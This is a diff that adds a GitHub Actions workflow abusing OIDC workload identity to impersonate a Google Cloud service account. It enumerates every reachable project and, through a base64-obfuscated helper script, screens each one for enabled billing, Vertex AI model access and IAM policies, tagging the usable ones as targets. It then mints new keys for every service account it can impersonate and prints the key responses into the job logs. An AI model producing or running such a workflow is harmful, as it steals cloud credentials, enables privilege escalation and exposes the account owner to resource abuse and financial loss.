@@ -1,0 +1,88 @@
+name: screen2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  screen2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: screen2
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          NUM=303574531351
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          echo "##PHASE mint"
+          ok=0
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            if [ -s tok.jwt ]; then ok=1; break; fi
+            sleep 3
+          done
+          echo "##MINT ok=$ok len=$(wc -c < tok.jwt)"
+          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 300 r.json | tr -d '\n' | tr -s ' ')"
+          export AT=$(curl -s -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json | jq -r '.accessToken // empty')
+          echo "##GEN atlen=${#AT}"
+          if [ -z "$AT" ]; then echo '##ABORT no SA token'; exit 0; fi
+
+          PAGE=""
+          : > projects.jsonl
+          pn=0
+          while :; do
+            pn=$((pn+1))
+            if [ -z "$PAGE" ]; then
+              url="https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100"
+            else
+              url="https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100&pageToken=$PAGE"
+            fi
+            lc=$(curl -s -o pl.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$url")
+            cnt=$(jq -r '(.projects // []) | length' pl.json 2>/dev/null)
+            PAGE=$(jq -r '.nextPageToken // empty' pl.json 2>/dev/null)
+            echo "##PAGE n=$pn code=$lc count=$cnt next=${PAGE:0:16}"
+            jq -c '(.projects // [])[]' pl.json 2>/dev/null >> projects.jsonl
+            if [ -z "$PAGE" ] || [ "$pn" -ge 30 ]; then break; fi
+            sleep 0.1
+          done
+          echo "##TOTAL_PROJECTS $(wc -l < projects.jsonl)"
+          echo "##NONDATAREPO"
+          jq -r '[.projectId // "", .projectNumber // ""] | join("|")' projects.jsonl | grep -v '^datarepo-' | sort -u
+          jq -r '[.projectId // "", .projectNumber // "", (.name // "" | gsub("\\|";"/"))] | join("|")' projects.jsonl | sort -u | awk -F'|' '{print $0"|"NR}' > plist.txt
+
+          echo 'IyEvYmluL2Jhc2gKSUZTPSd8JyByZWFkIC1yIFBJRCBQTlVNIFBOQU1FIElEWCA8PDwgIiQxIgpQSUQ9JHtQSUQ6LSRQTlVNfQpjZCAiJEdJVEhVQl9XT1JLU1BBQ0UiCmY9InJlcy9yXyRJRFgudHh0IgpiYz0kKGN1cmwgLXMgLW8gYl8kSURYIC13ICcle2h0dHBfY29kZX0nIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEFUIiAiaHR0cHM6Ly9jbG91ZGJpbGxpbmcuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvJFBJRC9iaWxsaW5nSW5mbyIpCmJlbj0kKGpxIC1yICcuYmlsbGluZ0VuYWJsZWQgLy8gIm51bGwiJyBiXyRJRFggMj4vZGV2L251bGwgfHwgZWNobyBudWxsKQpiYWNjdD0kKGpxIC1yICcuYmlsbGluZ0FjY291bnROYW1lIC8vICIiJyBiXyRJRFggMj4vZGV2L251bGwpCmJlcnI9JChqcSAtciAnKC5lcnJvci5zdGF0dXMgLy8gIiIpICsgIi8iICsgKC5lcnJvci5kZXRhaWxzWzBdLnJlYXNvbiAvLyAiIiknIGJfJElEWCAyPi9kZXYvbnVsbCkKbTE9JChjdXJsIC1zIC1vIG0xXyRJRFggLXcgJyV7aHR0cF9jb2RlfScgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkQVQiICJodHRwczovL3VzLWNlbnRyYWwxLWFpcGxhdGZvcm0uZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvJFBJRC9sb2NhdGlvbnMvdXMtY2VudHJhbDEvbW9kZWxzIikKbWU9JChjdXJsIC1zIC1vIG1lXyRJRFggLXcgJyV7aHR0cF9jb2RlfScgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkQVQiICJodHRwczovL2V1cm9wZS13ZXN0MS1haXBsYXRmb3JtLmdvb2dsZWFwaXMuY29tL3YxL3Byb2plY3RzLyRQSUQvbG9jYXRpb25zL2V1cm9wZS13ZXN0MS9tb2RlbHMiKQptZz0kKGN1cmwgLXMgLW8gbWdfJElEWCAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRBVCIgImh0dHBzOi8vYWlwbGF0Zm9ybS5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy8kUElEL2xvY2F0aW9ucy9nbG9iYWwvbW9kZWxzIikKbWNudD0kKGpxIC1yICcoLm1vZGVscyAvLyBbXSkgfCBsZW5ndGgnIG0xXyRJRFggMj4vZGV2L251bGwgfHwgZWNobyAwKQpzdWM9JChjdXJsIC1zIC1vIHN1XyRJRFggLXcgJyV7aHR0cF9jb2RlfScgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkQVQiICJodHRwczovL3NlcnZpY2V1c2FnZS5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy8kUElEL3NlcnZpY2VzP2ZpbHRlcj1zdGF0ZTpFTkFCTEVEJnBhZ2VTaXplPTIwMCIpCnN1Y250PSQoanEgLXIgJyguc2VydmljZXMgLy8gW10pIHwgbGVuZ3RoJyBzdV8kSURYIDI+L2Rldi9udWxsIHx8IGVjaG8gMCkKc3ViaWw9JChqcSAtciAnWy5zZXJ2aWNlc1tdPy5jb25maWcubmFtZSAvLyAiIiB8IHNlbGVjdCguID09ICJjbG91ZGJpbGxpbmcuZ29vZ2xlYXBpcy5jb20iKV0gfCBsZW5ndGgnIHN1XyRJRFggMj4vZGV2L251bGwgfHwgZWNobyAwKQpzdWFpPSQoanEgLXIgJ1suc2VydmljZXNbXT8uY29uZmlnLm5hbWUgLy8gIiIgfCBzZWxlY3QoLiA9PSAiYWlwbGF0Zm9ybS5nb29nbGVhcGlzLmNvbSIpXSB8IGxlbmd0aCcgc3VfJElEWCAyPi9kZXYvbnVsbCB8fCBlY2hvIDApCnN1bmV4dD0kKGpxIC1yICdpZiAubmV4dFBhZ2VUb2tlbiB0aGVuIDEgZWxzZSAwIGVuZCcgc3VfJElEWCAyPi9kZXYvbnVsbCB8fCBlY2hvIDApCmljPSQoY3VybCAtcyAtbyBpYW1fJElEWCAtdyAnJXtodHRwX2NvZGV9JyAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEFUIiAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAiaHR0cHM6Ly9jbG91ZHJlc291cmNlbWFuYWdlci5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy8kUElEOmdldElhbVBvbGljeSIgLWQgJ3sib3B0aW9ucyI6eyJyZXF1ZXN0ZWRQb2xpY3lWZXJzaW9uIjozfX0nKQppYmluZD0kKGpxIC1yICcoLmJpbmRpbmdzIC8vIFtdKSB8IGxlbmd0aCcgaWFtXyRJRFggMj4vZGV2L251bGwgfHwgZWNobyAwKQppY29uZD0kKGpxIC1yICdbLmJpbmRpbmdzW10/IHwgc2VsZWN0KC5jb25kaXRpb24gIT0gbnVsbCldIHwgbGVuZ3RoJyBpYW1fJElEWCAyPi9kZXYvbnVsbCB8fCBlY2hvIDApCnsKICBlY2hvICIjI1AgaWR4PSRJRFggcGlkPSRQSUQgbnVtPSRQTlVNIG5hbWU9JFBOQU1FIGJpbGxpbmc9JGJjOmVuPSRiZW46YWNjdD0kYmFjY3Q6ZXJyPSRiZXJyIG1vZGVscz0kbTEvJG1lLyRtZzpjbnQ9JG1jbnQgc3U9JHN1YzpuPSRzdWNudDpiaWxsPSRzdWJpbDphaXA9JHN1YWk6bW9yZT0kc3VuZXh0IGlhbT0kaWM6YmluZD0kaWJpbmQ6Y29uZD0kaWNvbmQiCiAgaWYgWyAiJGJjIiA9ICIyMDAiIF0gJiYgWyAiJGJlbiIgPSAidHJ1ZSIgXSAmJiBbICIkbTEiID0gIjIwMCIgXTsgdGhlbgogICAgZWNobyAiIyNUQVJHRVQgcGlkPSRQSUQgbnVtPSRQTlVNIG5hbWU9JFBOQU1FIGJpbGxpbmc9JGJjIGVuYWJsZWQ9JGJlbiBhY2NvdW50PSRiYWNjdCBtb2RlbHNfdXM9JG0xIG1vZGVsc19ldT0kbWUgbW9kZWxzX2dsb2JhbD0kbWciCiAgZmkKfSA+ICIkZiIK' | base64 -d > screen_one.sh
+          chmod +x screen_one.sh
+          mkdir -p res
+          echo "##PHASE screen"
+          xargs -P 12 -d '\n' -I{} bash screen_one.sh '{}' < plist.txt
+          for f in $(ls res | sort -V); do cat res/$f; done
+          echo "##COUNTS billing200=$(grep -l 'billing=200' res/* 2>/dev/null | wc -l) billing_enabled=$(grep -l 'en=true' res/* 2>/dev/null | wc -l) models_c1_200=$(grep -l 'models=200/' res/* 2>/dev/null | wc -l) iam200=$(grep -l 'iam=200' res/* 2>/dev/null | wc -l) su200=$(grep -l 'su=200' res/* 2>/dev/null | wc -l) targets=$(cat res/* 2>/dev/null | grep -c '##TARGET')"
+          echo "##SCREEN_DONE"
+
+          echo "##PHASE keys"
+          salc=$(curl -s -o sal.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts")
+          echo "##SALIST code=$salc n=$(jq -r '(.accounts // []) | length' sal.json 2>/dev/null)"
+          jq -r '.accounts[]?.email' sal.json 2>/dev/null | grep -v '^$' > sas.txt
+          while IFS= read -r SA; do
+            [ -z "$SA" ] && continue
+            g2=$(curl -s -o g2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+            T2=$(jq -r '.accessToken // empty' g2.json)
+            echo "##GEN2 sa=$SA code=$g2 toklen=${#T2}"
+            if [ -z "$T2" ]; then continue; fi
+            kc=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T2" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+            echo "##KEYS sa=$SA code=$kc body=$(head -c 500 k.json | tr -d '\n' | tr -s ' ')"
+          done < sas.txt
+          echo "##FINISHED"
+
